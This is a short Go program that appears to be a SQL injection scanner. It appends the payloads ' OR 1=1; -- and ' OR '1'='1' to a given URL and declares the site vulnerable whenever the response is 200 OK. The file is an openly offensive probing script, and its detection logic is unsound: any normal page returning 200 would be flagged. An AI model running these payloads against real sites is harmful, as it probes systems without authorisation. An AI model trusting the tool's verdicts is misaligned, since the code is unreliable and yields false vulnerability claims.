package main

import (
    "fmt"
    "net/http"
)

func scan(url string) {
    payloads := []string{"' OR 1=1; --", "' OR '1'='1'"}

    for _, payload := range payloads {
        fullURL := url + payload
        resp, err := http.Get(fullURL)
        if err != nil {
            fmt.Printf("Error checking URL %s: %s\n", fullURL, err)
            continue
        }

        if resp.StatusCode == http.StatusOK {
            fmt.Printf("[*] SQL Injection Vulnerability Found In %s\n", url)
            break
        }
    }
}

func main() {
    url := "yours url"
    scan(url)
}
